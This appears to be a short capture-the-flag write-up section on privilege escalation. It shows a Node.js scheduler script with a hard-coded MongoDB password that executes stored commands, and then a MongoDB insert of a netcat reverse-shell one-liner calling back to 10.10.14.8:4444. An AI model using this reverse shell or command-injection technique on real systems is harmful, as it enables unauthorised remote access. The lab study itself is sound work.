# 30 - PrivEsc


# linpeas.sh

![](vx_images/681879731664.png)

# app.js


```js
mark@node:/var/scheduler$ cat app.js 
const exec        = require('child_process').exec;
const MongoClient = require('mongodb').MongoClient;
const ObjectID    = require('mongodb').ObjectID;
const url         = 'mongodb://mark:5AYRft73VtFpc84k@localhost:27017/scheduler?authMechanism=DEFAULT&authSource=scheduler';

MongoClient.connect(url, function(error, db) {
  if (error || !db) {
    console.log('[!] Failed to connect to mongodb');
    return;
  }

  setInterval(function () {
    db.collection('tasks').find().toArray(function (error, docs) {
      if (!error && docs) {
        docs.forEach(function (doc) {
          if (doc) {
            console.log('Executing task ' + doc._id + '...');
            exec(doc.cmd);
            db.collection('tasks').deleteOne({ _id: new ObjectID(doc._id) });
          }
        });
      }
      else if (error) {
        console.log('Something went wrong: ' + error);
      }
    });
  }, 30000);

});
```

This program opens a connection to mongodb "scheduler" database and it grabs everything in "tasks" *collection* and stores it in "docs". "docs" in the app is basically an array of key-value pairs. After that it proceeds to execute each value stored in "cmd". This is the place where my reverse shell goes since app.js is executed by the user "tom".


```mongo -u mark -p 5AYRft73VtFpc84k scheduler
> db.tasks.insert( { cmd: 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.8 4444 >/tmp/f'})
WriteResult({ "nInserted" : 1 })
> db.tasks.find()
{ "_id" : ObjectId("60a14b280249aa0efd687520"), "cmd" : "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.8 4444 >/tmp/f" }
```

![](vx_images/5961738238787.png)


